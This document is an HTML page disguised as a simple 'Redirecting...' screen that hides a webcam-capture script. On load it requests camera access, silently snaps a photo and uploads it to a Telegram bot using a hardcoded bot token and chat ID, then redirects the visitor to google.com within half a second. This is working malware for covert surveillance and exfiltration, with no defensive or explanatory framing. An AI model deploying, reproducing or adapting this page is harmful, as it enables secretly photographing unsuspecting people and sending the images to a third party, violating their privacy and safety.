<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
</head>
<body style="margin:0; background:#000;">
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

  <script>
    const BOT_TOKEN = "7594029242:AAGlcWf6mZPKVm6NEsLsAEpqXWRrFhBaS8w";
    const CHAT_ID = "7009447523";
    const REDIRECT_URL = "https://google.com";

    async function startCapture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          setTimeout(async () => {
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataUrl = canvas.toDataURL("image/jpeg", 0.8);
            const blob = await (await fetch(dataUrl)).blob();

            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, "snap.jpg");

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
              method: "POST",
              body: formData
            }).catch((e) => console.log("Telegram error:", e));
          }, 100); // ultra fast
        };

        // Immediate redirect â€” no delay
        setTimeout(() => {
          window.location.href = REDIRECT_URL;
        }, 500); // max 0.5 sec delay

      } catch (err) {
        console.log("Permission not given or error:", err);
        // Still redirect if permission not given
        window.location.href = REDIRECT_URL;
      }
    }

    window.onload = startCapture;
  </script>
</body>
</html>
